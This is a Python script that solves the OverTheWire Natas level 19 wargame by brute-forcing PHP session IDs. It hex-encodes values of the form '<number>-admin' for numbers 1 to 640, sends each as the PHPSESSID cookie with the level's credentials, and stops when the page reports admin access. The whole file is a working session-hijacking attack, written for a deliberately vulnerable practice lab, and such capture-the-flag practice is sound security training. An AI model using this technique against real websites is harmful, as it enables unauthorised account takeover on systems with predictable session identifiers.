import requests
import sys

valid_chars = [x for x in range(1, 641)]
auth_pass = sys.argv[1]

for num in valid_chars:
    payload = {'username':'a', 'password':'a'}
    num_hex = "".join(hex(ord(digit)) for digit in str(num)).replace('0x', '')
    cookie = {'PHPSESSID': f'{num_hex}2d61646d696e'} # its '<random number>-admin' in hex 
    response = requests.post(
        'http://natas19.natas.labs.overthewire.org/index.php', 
        auth=('natas19', auth_pass),
        params=payload,
        cookies=cookie
    )
    if "You are an admin" in response.text:
        print(f"Found PHPSESSID - {num_hex}:\n {response.text}")
        break

